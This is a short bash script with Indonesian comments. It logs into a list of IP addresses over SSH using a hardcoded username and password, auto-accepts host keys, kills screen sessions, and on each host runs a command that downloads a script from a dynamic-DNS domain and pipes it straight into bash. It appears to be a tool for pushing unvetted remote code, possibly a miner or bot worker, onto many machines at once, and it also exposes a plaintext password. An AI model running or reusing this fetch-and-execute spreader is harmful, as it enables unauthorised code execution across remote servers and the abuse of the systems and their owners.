#!/bin/bash

clear

KON="$1"

USER="cloudsigma"
PASSWORD="Dotaja123@HHHH"
BECEK="dotpunya.sh"
URLDOT="https://coli.sytes.net"
COMMAND="pkill screen; nohup wget -qO- $URLDOT/$BECEK | bash -s"

IPS="$0"

IFS='#' read -ra IP_LIST <<< "$IPS"

COUNT=1

# Baca IP dari file.txt
for IP in "${IP_LIST[@]}"; do
    BIJI=$(printf "%02d" $COUNT)
    
    echo "Is Running Worker $IP..."
    /usr/bin/expect << EOF > /dev/null 2>&1
    set timeout 5
    spawn ssh $USER@$IP
    expect {
        "*yes/no*" { send "yes\r"; exp_continue }
        "*assword:*" { send "$PASSWORD\r"; exp_continue }
    }
    expect "$"  # Prompt yang menandakan login berhasil
    send "$COMMAND $KON $BIJI > /dev/null 2>&1\r"
    expect "$"  # Tunggu sampai perintah selesai
    send "exit\r"
    expect eof
EOF
((COUNT++))
done
